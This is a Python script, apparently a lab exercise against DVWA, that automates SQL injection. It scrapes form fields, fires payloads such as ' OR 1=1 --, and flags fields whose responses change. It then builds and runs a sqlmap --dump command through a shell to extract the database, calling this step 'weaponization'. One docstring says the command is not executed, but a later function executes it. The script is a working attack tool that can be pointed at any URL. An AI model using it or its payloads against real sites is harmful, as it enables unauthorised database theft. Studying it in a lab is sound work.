#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import hashlib
import os
import subprocess

# ================== CONFIGURATION ==================

URL = "http://192.168.40.2/DVWA/vulnerabilities/sqli/"
COOKIES = {
    "PHPSESSID": "TON_COOKIE_ICI",
    "security": "low"
}

PAYLOADS = [
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "1' AND '1'='1",
]

# ================== FONCTIONS D'ANALYSE ==================

def get_form_fields(url):
    """
    Récupère les champs d'un formulaire HTML,
    en excluant les boutons de type 'submit'.
    """
    r = requests.get(url, cookies=COOKIES)
    soup = BeautifulSoup(r.text, "html.parser")
    inputs = soup.find_all("input")
    fields = []
    for i in inputs:
        name = i.get("name")
        itype = i.get("type", "").lower()
        if name and itype != "submit":
            fields.append(name)
    return fields

def test_payload(field, payload):
    """
    Teste un payload SQLi sur un champ donné.
    """
    params = {field: payload, "Submit": "Submit"}
    r = requests.get(URL, params=params, cookies=COOKIES)
    return r

def is_suspect(response_normal, response_test):
    """
    Compare deux réponses pour détecter un comportement anormal.
    """
    if response_normal.status_code != response_test.status_code:
        return True
    if len(response_normal.text) != len(response_test.text):
        return True
    keywords = ["error", "sql", "warning", "syntax"]
    if any(k.lower() in response_test.text.lower() for k in keywords):
        return True
    return False

# ================== FONCTIONS WEAPONIZATION ==================

def generate_sqlmap_command(url, param, cookie):
    """
    Génère une commande sqlmap théorique à partir des informations détectées.
    Ne l'exécute pas.
    """
    cmd = (
        f"sqlmap -u \"{url}\" "
        f"-p {param} "
        f"--cookie=\"{cookie}\" "
        f"--batch --dump"
    )
    return cmd

def show_weaponized_payload(command):
    """
    Affiche la charge utile préparée (Weaponization).
    """
    print("\n═══ Phase de Weaponization ═══")
    print("Commande sqlmap générée (théorique) :\n")
    print(command)

def predict_sqlmap_output_folder(url):
    """
    Calcule le dossier où sqlmap stockerait les résultats.
    """
    domain = url.split("/")[2]
    folder = os.path.expanduser(f"~/.local/share/sqlmap/output/{domain}")
    return folder

def show_expected_dump_path(url):
    """
    Affiche le chemin où les données exfiltrées seraient stockées par sqlmap.
    """
    folder = predict_sqlmap_output_folder(url)
    print("Chemin de sortie attendu pour les données exfiltrées :")
    print(folder)
    print()

def run_sqlmap(command_str):
    """
    Exécute la commande sqlmap générée.
    Affiche la sortie dans le terminal.
    """
    print("→ Exécution de sqlmap en cours...\n")
    try:
        subprocess.run(command_str, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print("Erreur lors de l'exécution de sqlmap :")
        print(e)


# ================== MAIN ==================

def main():
    print("═══ Détection de champs vulnérables à la SQLI ═══\n")

    fields = get_form_fields(URL)
    print(f"Champs détectés : {fields}\n")

    # Réponse normale (sans payload)
    baseline = requests.get(URL, params={"id": "1", "Submit": "Submit"}, cookies=COOKIES)

    vulnerable_fields = []

    for field in fields:
        print(f"Test du champ : {field}")
        for payload in PAYLOADS:
            test = test_payload(field, payload)
            if is_suspect(baseline, test):
                print(f"  → Champ potentiellement vulnérable : {field}")
                print(f"    Payload déclencheur : {payload}\n")
                vulnerable_fields.append(field)
                break
        else:
            print(f"  → Aucun comportement suspect détecté.\n")

    if not vulnerable_fields:
        print("Aucun champ vulnérable détecté. Fin du script.")
        return

    # Pour ton scénario DVWA, on suppose que 'id' est le champ intéressant
    target_param = vulnerable_fields[0]
    cookie_str = f"PHPSESSID={COOKIES['PHPSESSID']}; security={COOKIES['security']}"

    cmd = generate_sqlmap_command(URL + "?id=1&Submit=Submit", target_param, cookie_str)
    show_weaponized_payload(cmd)
    show_expected_dump_path(URL)
    run_sqlmap(cmd)

if __name__ == "__main__":
    main()
